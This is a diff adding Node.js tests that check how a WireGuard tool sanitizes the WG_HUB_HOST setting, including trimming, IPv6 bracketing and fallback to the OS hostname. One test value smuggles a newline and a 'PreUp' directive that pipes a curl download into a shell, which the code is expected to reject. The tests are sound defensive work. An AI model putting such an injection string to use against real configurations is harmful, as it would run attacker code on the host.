@@ -7,7 +7,9 @@ import {
 	_buildPeerUpdates,
 	buildLinkRecord,
 	canonicalizeIpv4Network,
+	configuredHubHost,
 	isValidInterfaceAddress,
+	resolveHubHost,
 	buildRouteAnalysis,
 	buildTopology,
 	classifyLinkType,
@@ -30,6 +32,65 @@ test("canonicalizeIpv4Network masks host bits and rejects IPv6 / out-of-range / 
 	assert.equal(canonicalizeIpv4Network("999.0.0.0/8"), null, "out-of-range octet");
 	assert.equal(canonicalizeIpv4Network("10.0.0.0/33"), null, "bad prefix");
 	assert.equal(canonicalizeIpv4Network("10.0.0.0"), null, "missing prefix");
+});
+
+// ─── resolveHubHost / configuredHubHost (WG_HUB_HOST sanitization) ───────────
+
+test("configuredHubHost returns a clean WG_HUB_HOST, trimmed", () => {
+	const prev = process.env.WG_HUB_HOST;
+	try {
+		process.env.WG_HUB_HOST = "  proxy.comnic.de  ";
+		assert.equal(configuredHubHost(), "proxy.comnic.de");
+		process.env.WG_HUB_HOST = "95.216.66.221";
+		assert.equal(configuredHubHost(), "95.216.66.221");
+	} finally {
+		if (prev === undefined) delete process.env.WG_HUB_HOST;
+		else process.env.WG_HUB_HOST = prev;
+	}
+});
+
+test("configuredHubHost returns null for unset / whitespace / injected values", () => {
+	const prev = process.env.WG_HUB_HOST;
+	try {
+		delete process.env.WG_HUB_HOST;
+		assert.equal(configuredHubHost(), null, "unset");
+		process.env.WG_HUB_HOST = "   ";
+		assert.equal(configuredHubHost(), null, "all whitespace");
+		process.env.WG_HUB_HOST = "evil.com\nPreUp = curl x|sh";
+		assert.equal(configuredHubHost(), null, "newline injection");
+		process.env.WG_HUB_HOST = "proxy .comnic.de";
+		assert.equal(configuredHubHost(), null, "embedded space");
+	} finally {
+		if (prev === undefined) delete process.env.WG_HUB_HOST;
+		else process.env.WG_HUB_HOST = prev;
+	}
+});
+
+test("configuredHubHost bracket-wraps a bare IPv6 so host:port stays valid", () => {
+	const prev = process.env.WG_HUB_HOST;
+	try {
+		process.env.WG_HUB_HOST = "2a01:4f9:2b:307::221";
+		assert.equal(configuredHubHost(), "[2a01:4f9:2b:307::221]");
+		// Already-bracketed is left as-is (not double-wrapped).
+		process.env.WG_HUB_HOST = "[2a01:4f9:2b:307::221]";
+		assert.equal(configuredHubHost(), "[2a01:4f9:2b:307::221]");
+	} finally {
+		if (prev === undefined) delete process.env.WG_HUB_HOST;
+		else process.env.WG_HUB_HOST = prev;
+	}
+});
+
+test("resolveHubHost trims a valid value but falls back to OS hostname when malformed", () => {
+	const prev = process.env.WG_HUB_HOST;
+	try {
+		process.env.WG_HUB_HOST = "  hub.example.com  ";
+		assert.equal(resolveHubHost(), "hub.example.com");
+		process.env.WG_HUB_HOST = "bad host\nwith newline";
+		assert.equal(resolveHubHost(), os.hostname());
+	} finally {
+		if (prev === undefined) delete process.env.WG_HUB_HOST;
+		else process.env.WG_HUB_HOST = prev;
+	}
 });
 
 // ─── isValidInterfaceAddress (newline/PostUp injection guard for createInterface) ─
